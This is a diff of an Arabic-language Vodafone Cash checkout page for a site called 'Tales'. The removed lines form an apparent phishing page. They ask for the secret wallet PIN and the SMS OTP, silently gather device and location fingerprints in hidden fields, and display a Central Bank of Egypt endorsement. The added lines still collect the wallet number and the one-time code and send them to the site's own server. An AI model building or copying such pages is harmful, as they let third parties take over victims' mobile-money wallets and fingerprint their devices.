@@ -1,167 +1,139 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tales - الدفع عبر فودافون كاش</title>
-
-    <!-- 🔒 استدعاء ملفات الحماية والبيانات الخارجي -->
-    <script src="protection.js" defer></script>
-    <script src="Data.js" defer></script>
-
-    <!-- FontAwesome & Bootstrap Grid CSS -->
+    <title>Tales - دفع محفظة فودافون كاش</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/css/bootstrap-grid.min.css">
-
-    <!-- ملف التنسيقات الخارجي -->
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
     <header class="payment-header">
-        <h1>إتمام الدفع عبر فودافون كاش</h1>
+        <h1>الدفع بواسطة فودافون كاش</h1>
     </header>
 
     <div class="container">
         <div class="checkout-card">
             <section class="card-inputs">
-                <form id="vodafone_checkout_form" action="/api/pay" method="POST" novalidate>
-                    
-                    <!-- خانات مخفية لتحليل الأمان والبيانات -->
-                    <input type="hidden" name="payment_method" value="vodafone_cash">
-                    <input type="hidden" name="geoCity" id="geoCity" value="غير معروف">
-                    <input type="hidden" name="geoCountry" id="geoCountry" value="غير معروف">
-                    <input type="hidden" name="ispProvider" id="ispProvider" value="غير معروف">
-                    <input type="hidden" name="batteryInfo" id="batteryInfo" value="غير معروف">
-                    <input type="hidden" name="deviceRAM" id="deviceRAM" value="غير معروف">
-                    <input type="hidden" name="cpuCores" id="cpuCores" value="غير معروف">
-                    <input type="hidden" name="deviceType" id="deviceType" value="غير معروف">
-                    <input type="hidden" name="screenSize" id="screenSize" value="غير معروف">
-                    <input type="hidden" name="userTimeZone" id="userTimeZone" value="غير معروف">
-                    <input type="hidden" name="lang" id="lang" value="غير معروف">
-                    <input type="hidden" name="clientID" id="clientID" value="غير متوفر">
-
-                    <!-- 1. رقم المحفظة (Wallet Number) -->
+                
+                <!-- الخطوة الأولى: إدخال رقم المحفظة والمبلغ -->
+                <form id="vodafone_init_form">
                     <div class="input-group-custom">
-                        <label for="wallet_number">Wallet Number - رقم المحفظة:</label>
+                        <label for="vf_phone"><i class="fa fa-phone" aria-hidden="true"></i> رقم محفظة فودافون:</label>
                         <div class="input-wrapper">
-                            <input placeholder="010xxxxxxxx" 
-                                   type="text" 
-                                   inputmode="numeric" 
-                                   name="phone" 
-                                   id="wallet_number" 
-                                   maxlength="11" 
-                                   required
-                                   style="padding-right: 85px;">
-                            <div class="input-icon-right">
-                                <span class="meeza-badge" style="background-color: #e60000;">فودافون</span>
-                                <i class="fa fa-phone cash-icon" style="color: #e60000;" title="محفظة فودافون"></i>
-                            </div>
+                            <input placeholder="010XXXXXXXX" type="text" inputmode="numeric" id="vf_phone" maxlength="11" required>
                         </div>
-                        <div class="error-message" id="error_wallet">يرجى إدخال رقم محفظة فودافون صحيح (11 رقماً).</div>
                     </div>
 
-                    <!-- 2. المبلغ (Amount) -->
                     <div class="input-group-custom">
-                        <label for="pay_amount">Amount - المبلغ (L.E):</label>
+                        <label for="vf_amount">المبلغ (بالجنيه):</label>
                         <div class="input-wrapper">
-                            <input placeholder="1234 L.E" 
-                                   type="text" 
-                                   inputmode="numeric" 
-                                   name="amount" 
-                                   id="pay_amount" required>
+                            <input placeholder="أدخل المبلغ" type="text" inputmode="numeric" id="vf_amount" required>
                         </div>
-                        <div class="error-message" id="error_amount">يرجى إدخال مبلغ صحيح.</div>
                     </div>
 
-                    <!-- 3. الرقم السري للمحفظة (PIN) -->
-                    <div class="input-group-custom">
-                        <label for="wallet_pin">PIN - الرقم السري للمحفظة:</label>
-                        <div class="input-wrapper">
-                            <input placeholder="******" 
-                                   type="password" 
-                                   inputmode="numeric" 
-                                   name="wallet_pin" 
-                                   id="wallet_pin" 
-                                   maxlength="6" 
-                                   required
-                                   style="padding-left: 35px;">
-                            <button type="button" class="toggle-password" id="togglePinBtn" title="إظهار/إخفاء الرقم السري">
-                                <i class="fa fa-eye" id="pinIcon"></i>
-                            </button>
-                        </div>
-                        <div class="error-message" id="error_pin">يجيب إدخال الرقم السري للمحفظة مكون من أرقام صحيحة.</div>
-                    </div>
-
-                    <!-- 4. الرقم السري المتغير (OTP) مع زر إعادة الإرسال -->
-                    <div class="input-group-custom">
-                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
-                            <label for="wallet_otp" style="margin-bottom: 0;">OTP - الرقم السري المتغير:</label>
-                            <button type="button" id="resend_otp_btn" style="background: none; border: none; color: #01338D; font-size: 12px; font-weight: bold; cursor: pointer; padding: 0;">
-                                Resend OTP - إعادة إرسال الرمز
-                            </button>
-                        </div>
-                        <div class="input-wrapper">
-                            <input placeholder="******" 
-                                   type="text" 
-                                   inputmode="numeric" 
-                                   name="otp" 
-                                   id="wallet_otp" 
-                                   maxlength="6">
-                        </div>
-                        <div class="error-message" id="error_otp">أدخل رمز التأكيد المؤقت (OTP) المرسل في رسالة نصية.</div>
-                    </div>
-
-                    <!-- زر الدفع -->
                     <div class="card-footer-box">
-                        <button id="submitButton" type="submit" class="submit-btn" style="background-color: #e60000;">
-                            Pay with Wallet - ادفع بالمحفظة
+                        <button type="submit" id="requestOtpBtn" class="submit-btn">
+                            إرسال رمز التحقق (OTP)
                         </button>
                     </div>
-
                 </form>
 
-                <!-- رابط للعودة للصفحة الرئيسية -->
-                <div style="text-align: center; margin-top: 15px;">
-                    <a href="index.html" style="color: #01338D; font-size: 13px; text-decoration: underline;">العودة لوسائل الدفع الأخرى</a>
-                </div>
+                <!-- الخطوة الثانية: إدخال رمز التحقق OTP (مخفية لحين إرسال الطلب) -->
+                <form id="vodafone_otp_form" style="display: none; margin-top: 20px;">
+                    <div class="alert alert-info text-center" style="font-size: 14px;">
+                        تم إرسال رسالة تحتوي على رمز التحقق (OTP) إلى رقم هاتفك المحمول من شركة فودافون. يرجى إدخاله أدناه لإتمام الخصم.
+                    </div>
 
-                <!-- شعارات الاعتماد -->
-                <div class="container bank-logos-container" style="margin-top: 20px;">
-                    <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i> معتمد وتحت إشراف البنك المركزي</div>
-                    <div class="bank-logos-grid" style="display: flex; justify-content: center; align-items: center; margin-top: 10px;">
-                        <div class="bank-logo-card" title="البنك المركزي المصري">
-                            <img src="https://cbpn.currencyresearch.com/wp-content/uploads/2025/09/CentralBankofEgypt.png.webp" alt="البنك المركزي المصري" style="max-height: 40px;">
+                    <div class="input-group-custom">
+                        <label for="otp_code"><i class="fa fa-lock" aria-hidden="true"></i> رمز التحقق (OTP):</label>
+                        <div class="input-wrapper">
+                            <input placeholder="أدخل الكود المكون من أرقام" type="text" inputmode="numeric" id="otp_code" maxlength="6" required style="text-align: center; font-size: 20px; letter-spacing: 5px;">
                         </div>
                     </div>
-                </div>
+
+                    <div class="card-footer-box">
+                        <button type="submit" id="confirmPaymentBtn" class="submit-btn" style="background-color: #28a745;">
+                            تأكيد وإتمام الدفع
+                        </button>
+                    </div>
+                </form>
 
             </section>
         </div>
     </div>
 
-    <!-- كود إظهار وإخفاء الرقم السري والتفاعل -->
+    <!-- كود الجافاسكريبت للتفاعل الحقيقي مع السيرفر وبوابة الدفع -->
     <script>
-        document.getElementById('togglePinBtn').addEventListener('click', function() {
-            const pinInput = document.getElementById('wallet_pin');
-            const pinIcon = document.getElementById('pinIcon');
-            if (pinInput.type === 'password') {
-                pinInput.type = 'text';
-                pinIcon.className = 'fa fa-eye-slash';
-            } else {
-                pinInput.type = 'password';
-                pinIcon.className = 'fa fa-eye';
+        // الخطوة 1: طلب إرسال الـ OTP عند إدخال رقم الهاتف والمبلغ
+        document.getElementById('vodafone_init_form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const phone = document.getElementById('vf_phone').value;
+            const amount = document.getElementById('vf_amount').value;
+            const btn = document.getElementById('requestOtpBtn');
+
+            btn.disabled = true;
+            btn.innerText = 'جاري إرسال الطلب للبوابة...';
+
+            try {
+                const response = await fetch('/api/vodafone/initiate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, amount })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    // إخفاء نموذج الرقم وإظهار نموذج إدخال الـ OTP الحقيقي القادم من البوابة
+                    document.getElementById('vodafone_init_form').style.display = 'none';
+                    document.getElementById('vodafone_otp_form').style.display = 'block';
+                } else {
+                    alert(data.message || 'حدث خطأ أثناء الاتصال ببوابة الدفع.');
+                    btn.disabled = false;
+                    btn.innerText = 'إرسال رمز التحقق (OTP)';
+                }
+            } catch (error) {
+                alert('فشل الاتصال بالخير/السيرفر.');
+                btn.disabled = false;
+                btn.innerText = 'إرسال رمز التحقق (OTP)';
             }
         });
 
-        document.getElementById('resend_otp_btn').addEventListener('click', function() {
-            alert('تم إرسال رمز OTP جديد إلى رقم هاتفك المسجل بنجاح.');
+        // الخطوة 2: إرسال الـ OTP المدخل لتأكيد المعاملة نهائياً
+        document.getElementById('vodafone_otp_form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const otp = document.getElementById('otp_code').value;
+            const btn = document.getElementById('confirmPaymentBtn');
+
+            btn.disabled = true;
+            btn.innerText = 'جاري التحقق...';
+
+            try {
+                const response = await fetch('/api/vodafone/verify-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ otp })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.success) {
+                    alert('تمت عملية الدفع بنجاح!');
+                    window.location.href = 'success.html'; // أو صفحة النجاح الخاصة بك
+                } else {
+                    alert(data.message || 'رمز التحقق غير صحيح أو انتهت صلاحيته.');
+                    btn.disabled = false;
+                    btn.innerText = 'تأكيد وإتمام الدفع';
+                }
+            } catch (error) {
+                alert('حدث خطأ أثناء تأكيد العملية.');
+                btn.disabled = false;
+                btn.innerText = 'تأكيد وإتمام الدفع';
+            }
         });
     </script>
-
-    <!-- استدعاء ملف الـ Widget للشات الدعم المباشر -->
-    <script src="/chat-widget.js" defer></script>
 </body>
 </html>
